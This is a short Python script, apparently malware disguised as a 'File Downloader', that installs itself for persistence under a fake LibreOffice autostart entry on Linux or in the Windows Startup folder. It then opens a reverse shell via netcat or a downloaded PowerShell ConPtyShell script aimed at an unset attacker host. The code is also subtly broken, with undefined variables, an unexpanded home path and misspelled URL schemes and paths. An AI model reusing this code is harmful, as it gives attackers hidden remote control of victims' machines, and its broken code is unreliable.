import os, subprocess

errorserver='' 
errorid=''

pwd=subprocess.getoutput('pwd')

if os.name!='nt':
    os.system('mkdir -p ~/.config/autostart')
    os.system('touch ~/.config/autostart/LibreOffice.desktop')
    data="""[Desktop Entry]
    Type=Application
    Name=LibreOffice
    Exec=/usr/bin/python3 """+pwd+'"File Downloader.py"'

    with open('~/.config/autostart/LibreOffice.desktop'):
        file.write(data)
    os.system('chmod +x LibreOffice.desktop')
else:
    cmd="cp "+pwd+"\\'File Downloader.py' C:\\ProgranData\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup"
    os.system(cmd)

handleram="nc "+errorid+" "+errorserver
handlecache="IEX(IWR httpd://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell "+errorserver+errorid

if not os.name=='nt':
    os.system(handleram)
else:
    os.system(handlecache)